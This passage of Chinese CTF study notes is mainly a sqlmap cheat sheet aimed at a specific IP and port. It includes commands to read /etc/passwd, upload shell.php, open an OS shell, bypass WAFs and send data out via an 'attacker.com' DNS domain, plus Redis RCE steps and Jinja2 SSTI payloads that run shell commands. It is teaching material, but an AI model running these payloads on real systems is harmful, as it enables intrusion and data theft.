> python sqlmap.py -l log.txt —scope=”(www)?.target.(com|net|arg)”

**-c sqlmap.conf ：使用配置文件进行扫描 (sqlmap.conf与sqlmap.py 在同一目录)**

> python sqlmap.py -c sqlmap.conf

**-u “URL” ： 对于这种写法，加\*号扫描**

> python sqlmap.py -u “[http://target_url/param1/value1*/param2/value2](https://link.zhihu.com/?target=http%3A//target_url/param1/value1*/param2/value2)“

##### 四.配置目标参数

**-p ：指定要扫描的参数**

> python sqlmap.py -u “[http://59.63.200.79:8003/?id=1&username=admin&password=123](https://link.zhihu.com/?target=http%3A//59.63.200.79%3A8003/%3Fid%3D1%26username%3Dadmin%26password%3D123)“ -p “username,id”

**—skip： 排除指定的扫描参数**

> python sqlmap.py -u “[http://59.63.200.79:8003/?id=1&username=admin&password=123](https://link.zhihu.com/?target=http%3A//59.63.200.79%3A8003/%3Fid%3D1%26username%3Dadmin%26password%3D123)“ —skip “username,id”

**—data： 指定扫描的参数，get/post都适用**

> python sqlmap.py -u “[http://59.63.200.79:8003/?id=1&username=admin&password=123](https://link.zhihu.com/?target=http%3A//59.63.200.79%3A8003/%3Fid%3D1%26username%3Dadmin%26password%3D123)“ —date=”username=admin&password=123”

**—param-del：改变分隔符，默认是&，因为有些网站不实用&传递多个数据。**

> python sqlmap.py -u “[http://59.63.200.79:8003/?id=1&username=admin&password=123](https://link.zhihu.com/?target=http%3A//59.63.200.79%3A8003/%3Fid%3D1%26username%3Dadmin%26password%3D123)“ —date=”username=admin;password=123” —param-del=”;”

**—cookie ：使用cookie的身份认证**

> python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](https://link.zhihu.com/?target=http%3A//59.63.200.79%3A8003/%3Fid%3D1)“ —cookie=”security=low;PHPSESSID=121123131”

**—drop-set-cookie： 有时候发起请求后，服务器端会重新Set-cookie给客户端，SQLmap默认会使用新的cookie，这时候可以设置此参数，表示还是用原来的cookie。**

> python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](https://link.zhihu.com/?target=http%3A//59.63.200.79%3A8003/%3Fid%3D1)“ —cookie=”security=low;PHPSESSID=121123131 —-drop-set-cookie”

**—user-agent ：使用浏览器代理头**

> python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](https://link.zhihu.com/?target=http%3A//59.63.200.79%3A8003/%3Fid%3D1)“ —user-agent=”aaaaaaaaa”

**—random-agent： 使用随机的浏览器代理头**

> python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](https://link.zhihu.com/?target=http%3A//59.63.200.79%3A8003/%3Fid%3D1)“ —random-agent

**—host ：指定主机头**

> python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](https://link.zhihu.com/?target=http%3A//59.63.200.79%3A8003/%3Fid%3D1)“ —host=”aaaaa”

**—referer=”aaaaaa” ： 指定referer头**

> python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](https://link.zhihu.com/?target=http%3A//59.63.200.79%3A8003/%3Fid%3D1)“ —referer=”aaaaaa”

**—headers ：有些网站需要特定的头来身份验证**

> python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](https://link.zhihu.com/?target=http%3A//59.63.200.79%3A8003/%3Fid%3D1)“ —headers=”host:aaaa\nUser-Agent:bbbb”

**—method ：指定请求方式，还有POST**

> python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](https://link.zhihu.com/?target=http%3A//59.63.200.79%3A8003/%3Fid%3D1)“ —method=GET

**—auth-type ， —auth-cred： 身份认证，还有Digest、NTLM**

> python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](https://link.zhihu.com/?target=http%3A//59.63.200.79%3A8003/%3Fid%3D1)“ —auth-type Basic —auth-cred “user:pass”

**—auth-file=”ca.PEM” ： 使用私钥证书去进行身份认证，还有个参数—auth-cert，暂时不知道怎么用，没遇到过**

**—proxy ：使用代理去扫描目标，代理软件占用的端口在8080**

> python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](https://link.zhihu.com/?target=http%3A//59.63.200.79%3A8003/%3Fid%3D1)“ —proxy=”[http://127.0.0.1:8080/](https://link.zhihu.com/?target=http%3A//127.0.0.1%3A8080/)“

**—proxy-cred：使用代理时的账号和密码**

> python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](https://link.zhihu.com/?target=http%3A//59.63.200.79%3A8003/%3Fid%3D1)“ —proxy=”[http://127.0.0.1:8080/](https://link.zhihu.com/?target=http%3A//127.0.0.1%3A8080/)“ —proxy-cred=”name:pass”

**—ignore-proxy ： 忽略系统级代理设置，通常用于扫描本地网络目标，本网段。**

> python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](https://link.zhihu.com/?target=http%3A//59.63.200.79%3A8003/%3Fid%3D1)“ —ignore-proxy

##### 五.配置目标行为

**—force-ssl：使用HTTPS连接进行扫描**

> python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](https://link.zhihu.com/?target=http%3A//59.63.200.79%3A8003/%3Fid%3D1)“ —force-ssl

**—delay：每次http请求之间的延迟时间，默认无延迟**

> python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](https://link.zhihu.com/?target=http%3A//59.63.200.79%3A8003/%3Fid%3D1)“ —delay=”3”

**—timeout：请求超时时间，浮点数，默认为30秒**

> python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](https://link.zhihu.com/?target=http%3A//59.63.200.79%3A8003/%3Fid%3D1)“ —timeout=”10”

**—retries：http连接的重试次数，默认3次**

> python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](https://link.zhihu.com/?target=http%3A//59.63.200.79%3A8003/%3Fid%3D1)“ —retries=”1”

**—randomize：长度、类型与原始值保持一致的情况下,随机参数的取值。比如id=100 -> id=1??**

> python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](https://link.zhihu.com/?target=http%3A//59.63.200.79%3A8003/%3Fid%3D1)“ —randomize=”id”

**—safe-url：检测盲注阶段时，sqlmap会发送大量失败请求，可能导致服务器端销毁session**

> python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](https://link.zhihu.com/?target=http%3A//59.63.200.79%3A8003/%3Fid%3D1)“ —safe-url=”URL”

**—safe-freq ： 每发送多少次注入请求后，发送一次正常请求，配合—safe-url使用。**

> python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](https://link.zhihu.com/?target=http%3A//59.63.200.79%3A8003/%3Fid%3D1)“ —safe-freq

**—time-sec： 基于时间的注入检测相应延迟时间，默认5秒**

> python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](https://link.zhihu.com/?target=http%3A//59.63.200.79%3A8003/%3Fid%3D1)“ —time-sec=”3”

**—union-cols ：默认联合查询1-10列，随—level增加，最多支持100列。**

> python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](https://link.zhihu.com/?target=http%3A//59.63.200.79%3A8003/%3Fid%3D1)“ —union-cols 6-9

**—union-char：联合查询默认使用null，极端情况下可能失败，此时可以手动执行数值**

> python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](https://link.zhihu.com/?target=http%3A//59.63.200.79%3A8003/%3Fid%3D1)“ —union-char 123

**—technique US ： 指定检测注入时所用技术，默认情况下Sqlmap会使用自己支持的全部技术进行检测，有B、E、U、S、T、Q**

> python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](https://link.zhihu.com/?target=http%3A//59.63.200.79%3A8003/%3Fid%3D1)“ —technique US

##### 六.优化探测过程

**—level 2：检测cookie中是否含有注入、3：检测user-agent、referer是否含有注入、5：检测host是否含有注入**

> python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](https://link.zhihu.com/?target=http%3A//59.63.200.79%3A8003/%3Fid%3D1)“ —level 3

**—risk 默认1，最高4，等级高容易造成数据被篡改风险**

> python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](https://link.zhihu.com/?target=http%3A//59.63.200.79%3A8003/%3Fid%3D1)“ —risk 3

**—predict-output ： 优化检测方法，不断比对大数据，缩小检测范围，提高效率，与—threads参数不兼容**

> python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](https://link.zhihu.com/?target=http%3A//59.63.200.79%3A8003/%3Fid%3D1)“ —predict-output

**—keep-alive ： 长连接、性能好，避免重复建立的网络开销，但大量长连接会占用服务器资源。与—proxy参数不兼容**

> python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](https://link.zhihu.com/?target=http%3A//59.63.200.79%3A8003/%3Fid%3D1)“ —keep-alive

**—null-connection ： 只获取页面大小的值，通常用于盲注判断真假，与—text-only 不兼容**

> python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](https://link.zhihu.com/?target=http%3A//59.63.200.79%3A8003/%3Fid%3D1)“ —null-connection

**-o ： 直接开启以上三个(—predict-output、—keep-alive、—null-connection)**

> python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](https://link.zhihu.com/?target=http%3A//59.63.200.79%3A8003/%3Fid%3D1)“ -o

**—threads=7 ：提高并发线程，默认为1，建议不要超过10，否则影响站点可用性，与—predict-out不兼容**

> python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](https://link.zhihu.com/?target=http%3A//59.63.200.79%3A8003/%3Fid%3D1)“ —threads=7

**—string=”woaini” ： 页面比较，用于基于布尔注入的检测，因为有时候页面随时间阈值变化，此时需要人为指定标识真假的字符串**

除此之外，还有—not-string=”woaini”、—code=200、—titles=”Welcome”等等

> python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](https://link.zhihu.com/?target=http%3A//59.63.200.79%3A8003/%3Fid%3D1)“ —string=”woaini”

##### 七.特定目标环境 

**—skip-urlencode ：默认get传参会使用URL编码，但有些服务器没按规范，使用原始字符提交数据**。

> python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](https://link.zhihu.com/?target=http%3A//59.63.200.79%3A8003/%3Fid%3D1)“ —skip-urlencode

**—eval ：在提交前，对参数进行pyhton的处理，提升效率**

> python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](https://link.zhihu.com/?target=http%3A//59.63.200.79%3A8003/%3Fid%3D1)“ —eval=”import hashlib;hash=hashlib.md5(id).hexdigest()”

**—dbms ： 指定数据库类型，还可以加上版本 Mysql<5.0>**

> python sqlmap.py -u “[http://59.63.200.79:8003](https://link.zhihu.com/?target=http%3A//59.63.200.79%3A8003/)/?id=1” —dbms=”Mysql”

**—os ： 指定操作系统，还可以是Linux**

> python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](https://link.zhihu.com/?target=http%3A//59.63.200.79%3A8003/%3Fid%3D1)“ —os=”Windows”

**—invalid-bignum ：sqlmap默认使用负值让参数进行失效，该参数使用最大值让参数失效，比如 id=9999999**

> python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](https://link.zhihu.com/?target=http%3A//59.63.200.79%3A8003/%3Fid%3D1)“ —invalid-bignum

**—invalid-logical ：使用布尔值，比如 id 13 and 18=19**

> python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](https://link.zhihu.com/?target=http%3A//59.63.200.79%3A8003/%3Fid%3D1)“ —invalid-logical

**—no-cast： 将sqlmap取出的数据转换为字符串，并用空格替换NULL结果，在老版本时需要开启此开关。**

> python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](https://link.zhihu.com/?target=http%3A//59.63.200.79%3A8003/%3Fid%3D1)“ —no-cast

**—no-escape：为了逃逸服务器端对sqlmap的检测，默认使用char()编码替换字符串。本参数将关闭此功能。比如 select ‘foo’ —> select cahr(102) + char(111) + char(111)**

> python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](https://link.zhihu.com/?target=http%3A//59.63.200.79%3A8003/%3Fid%3D1)“ —no-escape

**—prefix：添加前缀**

> python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](https://link.zhihu.com/?target=http%3A//59.63.200.79%3A8003/%3Fid%3D1)“ —prefix “‘)’”

**—suffix ：添加后缀**

> python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](https://link.zhihu.com/?target=http%3A//59.63.200.79%3A8003/%3Fid%3D1)“ —suffix “AND (‘abc’=’abc”

**—tamper：使用脚本，绕过IPS、WAF等**

> python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](https://link.zhihu.com/?target=http%3A//59.63.200.79%3A8003/%3Fid%3D1)“ —tamper=”tamper/between.py,tamper/randomcase.py”

**—dns-domain：攻击者控制了DNS服务器，可以提高取出数据的效率**

> python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](https://link.zhihu.com/?target=http%3A//59.63.200.79%3A8003/%3Fid%3D1)“ —dns-domain attacker.com

**—second-order：在一个页面注入的结果，从另外一个页面提现出来**

> python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](https://link.zhihu.com/?target=http%3A//59.63.200.79%3A8003/%3Fid%3D1)“ —second-order “[http://1.1.1.1/b.php](https://link.zhihu.com/?target=http%3A//1.1.1.1/b.php)“

##### 八.查看基本信息 

**-f ：扫描时加入数据库指纹检测**

> python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](https://link.zhihu.com/?target=http%3A//59.63.200.79%3A8003/%3Fid%3D1)“ -f

**-b ： 查看数据库的版本信息**

> python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](https://link.zhihu.com/?target=http%3A//59.63.200.79%3A8003/%3Fid%3D1)“ -b

##### 九.查看数据信息

**—users ： 查询所有的数据库账号**

> python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](https://link.zhihu.com/?target=http%3A//59.63.200.79%3A8003/%3Fid%3D1)“ —users

**—dbs ： 查询所有数据库**

> python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](https://link.zhihu.com/?target=http%3A//59.63.200.79%3A8003/%3Fid%3D1)“ —dbs

**—schema ： 查询源数据库（包含定义数据的数据）**

> python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](https://link.zhihu.com/?target=http%3A//59.63.200.79%3A8003/%3Fid%3D1)“ —schema

**-a ： 查询当前user、当前数据库、主机名、当前user是否是最大权限管理员、数据库账号等**

> python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](https://link.zhihu.com/?target=http%3A//59.63.200.79%3A8003/%3Fid%3D1)“ -a

**-D dvwa： 指定数据库**

> python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](https://link.zhihu.com/?target=http%3A//59.63.200.79%3A8003/%3Fid%3D1)“ -D database_name

**—current-user ： 查询当前数据库用户**

> python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](https://link.zhihu.com/?target=http%3A//59.63.200.79%3A8003/%3Fid%3D1)“ —current-user

**—current-db ： 查询当前数据库**

> python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](https://link.zhihu.com/?target=http%3A//59.63.200.79%3A8003/%3Fid%3D1)“ —current-db

**—hostname ： 查看服务器的主机名**

> python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](https://link.zhihu.com/?target=http%3A//59.63.200.79%3A8003/%3Fid%3D1)“ —hostname

**—Privileges -U username ： 查询username的权限**

> python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](https://link.zhihu.com/?target=http%3A//59.63.200.79%3A8003/%3Fid%3D1)“ —Privileges -U username

**—roles ：查询角色**

> python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](https://link.zhihu.com/?target=http%3A//59.63.200.79%3A8003/%3Fid%3D1)“ —roles

**—tables ： 查看所有的表**

> python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](https://link.zhihu.com/?target=http%3A//59.63.200.79%3A8003/%3Fid%3D1)“ —tables

**-T ： 指定表**

> python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](https://link.zhihu.com/?target=http%3A//59.63.200.79%3A8003/%3Fid%3D1)“ -T table_name

**—columns ： 查看所有的字段**

> python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](https://link.zhihu.com/?target=http%3A//59.63.200.79%3A8003/%3Fid%3D1)“ —columns

**-C ： 指定字段**

> python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](https://link.zhihu.com/?target=http%3A//59.63.200.79%3A8003/%3Fid%3D1)“ -C column_name

**—count ： 计数，查看有多少条数据**

> python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](https://link.zhihu.com/?target=http%3A//59.63.200.79%3A8003/%3Fid%3D1)“ —count

**—exclude-sysdbs ： 排除系统库**

> python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](https://link.zhihu.com/?target=http%3A//59.63.200.79%3A8003/%3Fid%3D1)“ —exclude-sysdbs

**—dump ： 查看数据**

> python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](https://link.zhihu.com/?target=http%3A//59.63.200.79%3A8003/%3Fid%3D1)“ —dump

**—start 3 ： 查看第三条**

> python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](https://link.zhihu.com/?target=http%3A//59.63.200.79%3A8003/%3Fid%3D1)“ —start 3

**—end 4 ： 查看第四条**

> python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](https://link.zhihu.com/?target=http%3A//59.63.200.79%3A8003/%3Fid%3D1)“ —end 4

**—sql-query “select \* from users” ： 执行语句**

> python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](https://link.zhihu.com/?target=http%3A//59.63.200.79%3A8003/%3Fid%3D1)“ —sql-query “select * from users”

**—common-columns ： 暴力破解字段，应用于两种情况：①无权限读取数据。②mysql<5.0 ，没有infomation_schema库**

> python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](https://link.zhihu.com/?target=http%3A//59.63.200.79%3A8003/%3Fid%3D1)“ —common-columns

**—common-tables ： 暴力破解表**

> python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](https://link.zhihu.com/?target=http%3A//59.63.200.79%3A8003/%3Fid%3D1)“ —common-tables

##### 十.其他参数

**—batch ： 自动选是**

> python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](https://link.zhihu.com/?target=http%3A//59.63.200.79%3A8003/%3Fid%3D1)“ —batch

**—charset：强制字符编码**

> python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](https://link.zhihu.com/?target=http%3A//59.63.200.79%3A8003/%3Fid%3D1)“ —charset=GBK

**—crawl：爬站深度**

> python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](https://link.zhihu.com/?target=http%3A//59.63.200.79%3A8003/%3Fid%3D1)“ —crawl=3

**—csv-del：指定csv文件的分隔符**

> python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](https://link.zhihu.com/?target=http%3A//59.63.200.79%3A8003/%3Fid%3D1)“ —csv-del=”;”

**—flush-session ： 清空session**

> python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](https://link.zhihu.com/?target=http%3A//59.63.200.79%3A8003/%3Fid%3D1)“ —flush-session

**—force-ssl ： 强制使用HTTPS**

> python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](https://link.zhihu.com/?target=http%3A//59.63.200.79%3A8003/%3Fid%3D1)“ —force-ssl

**—fresh-queries ： 重新检测，不使用本地已查询的数据**

> python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](https://link.zhihu.com/?target=http%3A//59.63.200.79%3A8003/%3Fid%3D1)“ —fresh-queries

**—hex ： 以16进制的形式编码dump出来的数据**

> python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](https://link.zhihu.com/?target=http%3A//59.63.200.79%3A8003/%3Fid%3D1)“ —hex

**—parse-errors ： 分析和显示数据库内建报错信息**

> python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](https://link.zhihu.com/?target=http%3A//59.63.200.79%3A8003/%3Fid%3D1)“ —parse-errors

**—answer ： 回答**

> python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](https://link.zhihu.com/?target=http%3A//59.63.200.79%3A8003/%3Fid%3D1)“ —answer=”extending=N”

**—check-waf ： 检测WAF/IPS/IDS**

> python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](https://link.zhihu.com/?target=http%3A//59.63.200.79%3A8003/%3Fid%3D1)“ —check-waf

**—hpp ： 绕过WAF/IPS/IDS**

> python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](https://link.zhihu.com/?target=http%3A//59.63.200.79%3A8003/%3Fid%3D1)“ —hpp

**—identify-waf ： 彻底检测WAF/IPS/IDS**

> python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](https://link.zhihu.com/?target=http%3A//59.63.200.79%3A8003/%3Fid%3D1)“ —identify-waf

**—mobile ： 模拟智能手机设备**

> python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](https://link.zhihu.com/?target=http%3A//59.63.200.79%3A8003/%3Fid%3D1)“ —mobile

**—purge-output ： 清除output文件夹**

> python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](https://link.zhihu.com/?target=http%3A//59.63.200.79%3A8003/%3Fid%3D1)“ —purge-output

**—smart ： 当有大量检测目标时，只选择基于错误的检测结果**

> python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](https://link.zhihu.com/?target=http%3A//59.63.200.79%3A8003/%3Fid%3D1)“ —smart

##### 十一.高级注入参数 

**—file-read：文件系统访问**

> python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](https://link.zhihu.com/?target=http%3A//59.63.200.79%3A8003/%3Fid%3D1)“ —file-read=”/etc/passwd”

**—file-write、—file-dest ：写文件到目标位置**

> python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](https://link.zhihu.com/?target=http%3A//59.63.200.79%3A8003/%3Fid%3D1)“ —file-write=”shell.php” —file-dest “/tmp/shell.php”

**—sql-shell ： 进入交互式mysql窗口**

> python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](https://link.zhihu.com/?target=http%3A//59.63.200.79%3A8003/%3Fid%3D1)“ —sql-shell

**—os-shell ： 进入命令行窗口**

> python sqlmap.py -u “[http://59.63.200.79:8003/?id=1](https://link.zhihu.com/?target=http%3A//59.63.200.79%3A8003/%3Fid%3D1)“ —os-shell

**使用Tor代理**

> sqlmap.py -u [http://navisec.it/123.asp?id=1](https://link.zhihu.com/?target=http%3A//navisec.it/123.asp%3Fid%3D1) —tor -tor-type=SOCKS5 —tor-port=9050 —check-tor

### （二）redis

#### redis提权

[redis未授权访问漏洞三种提权方式](https://blog.csdn.net/fryhrx/article/details/124087653)

##### 有文件上传权限时

例：[NSSCTF - \[天翼杯 2021]esay_eval (ctfer.vip)](https://www.ctfer.vip/problem/364)

通过找到redis密码，使用蚁剑插件进行链接，MODULE LOAD命令，在命令行下运行恶意脚本exp.so[GitHub - Dliv3/redis-rogue-server: Redis 4.x/5.x RCE](https://github.com/Dliv3/redis-rogue-server)，之后使用system.exec "<执行的命令>"来获得终端权限。

### （三）MongoDB

## 六、验证漏洞和逻辑漏洞

### （一）文件上传

### （二）远程执行

## 七、服务器模板渲染引擎注入

#### [Smarty]

在smarty中，低版本可以使用{php} {/php}标签执行php代码，新版本（3.1左右）不支持此标签，但仍然可以构造，{if phpinfo()}{/if}，在if标签中可以添加php代码。

#### [jinja2/flask]

1.控制结构 {% %}

```jinja2
{% if user %}

Hello,{{user}} !

{% else %}

Hello,Stranger!

{% endif %}
```

2.变量取值 {{ }}

> jinja2模板中使用 {{ }} 语法表示一个变量，它是一种特殊的占位符。当利用jinja2进行渲染的时候，它会把这些特殊的占位符进行填充/替换，jinja2支持python中所有的Python数据类型比如列表、字段、对象等。

3.注释 {# #}

由于jinja由python开，发python2与3差别较大，为了找到两个版本都通用的函数来进行注入，我们一般直接使用如下payload

```jinja2
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__']['eval']("__import__('os').popen('tac /flag.txt').read()") }}{% endif %}{% endfor %}
```

第一句是为了获得子类，第二句为了获得找到了一个python2/3都有__builtins__的类 `_IterationGuard`的位置从而执行

或者直接从globals中寻找

```jinja2
{% for c in [].__class__.__base__.__subclasses__() %}
{% if c.__name__ == 'catch_warnings' %}
  {% for b in c.__init__.__globals__.values() %}
  {% if b.__class__ == {}.__class__ %}
    {% if 'eval' in b.keys() %}
      {{ b['eval']('__import__("os").popen("id").read()') }}
    {% endif %}
  {% endif %}
  {% endfor %}
{% endif %}
{% endfor %}
```

#### [Thymeleaf]

[Thymeleaf SSTI 分析以及最新版修复的 Bypass - panda | 热爱安全的理想少年 (cnpanda.net)](https://www.cnpanda.net/sec/1063.html)

## 八、linux和windows

### （一）常用命令

#### 文件读取

```bash
cat:正序读取文件内容并输出
tac:倒序读取文件内容并输出
nl:与cat相同，但显示行号
less:显示行号，只能显示一页
tail:查看前10行
head:与tail相似
```

##### [MoeCTF2024垫刀之路一]

这道题目给我一个提醒，在Linux环境下可以使用`echo`显示环境变量具体内容：

```bash
echo $PATH
```

其中`$`是必须加的内容，代表环境变量，`PATH`是环境变量的名称，在这个题中，需要`echo $FLAG`。

## 九、常用工具

### Python库

#### requests库

```python
import requests
```

#### BeautifulSoup4库

BeautifulSoup4是爬虫必学的技能。BeautifulSoup最主要的功能是从网页抓取数据，Beautiful Soup自动将输入文档转换为Unicode编码，输出文档转换为utf-8编码。BeautifulSoup支持Python标准库中的HTML解析器,还支持一些第三方的解析器，如果我们不安装它，则 Python 会使用 Python默认的解释器。

BeautifulSoup4将复杂HTML文档转换成一个复杂的树形结构,每个节点都是Python对象,所有对象可以归纳为4种:

- Tag
- NavigableString
- BeautifulSoup
- Comment



